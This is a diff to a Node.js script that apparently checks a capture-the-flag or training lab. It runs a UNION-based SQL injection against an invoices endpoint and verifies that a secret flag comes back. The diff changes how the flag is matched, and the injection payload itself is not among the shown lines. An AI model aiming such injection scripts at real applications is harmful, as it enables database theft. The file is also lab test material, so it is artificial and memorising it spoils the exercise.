@@ -1,6 +1,6 @@
 #!/usr/bin/env node
-/** V2.2 SQLi — UNION extract secret_flags */
-import { extractFlag } from '../../../packages/shared/dist/index.js';
+/** V2.2 SQLi — UNION extract secret_flags (works with seed or planter-rotated flags) */
+import { extractFlag, isValidFlag } from '../../../packages/shared/dist/index.js';
 
 function arg(name, fallback) {
   const i = process.argv.indexOf(`--${name}`);
@@ -23,20 +23,18 @@ const res = await fetch(url, {
 const text = await res.text();
 console.log('status', res.status);
 console.log(text.slice(0, 400));
+
 let flag = null;
 try {
   const data = JSON.parse(text);
-  const row = data.invoices?.find((i) => i.title === 'sqli_flag' || i.memo?.includes('a202'));
-  flag = row ? extractFlag(JSON.stringify(row)) : null;
+  const row = data.invoices?.find((i) => i.title === 'sqli_flag');
+  if (row) flag = extractFlag(JSON.stringify(row));
 } catch {
   /* ignore */
 }
 if (!flag) flag = extractFlag(text);
-// Prefer the secret_flags value when multiple TRN{} appear
-const all = text.match(/TRN\{[0-9a-f]{32}\}/g) || [];
-const sqliFlag = all.find((f) => f.includes('a202'));
-if (sqliFlag) flag = sqliFlag;
-if (!flag || !flag.includes('a202')) {
+
+if (!flag || !isValidFlag(flag)) {
   console.error('FAIL: SQLi did not return secret_flags flag');
   process.exit(1);
 }
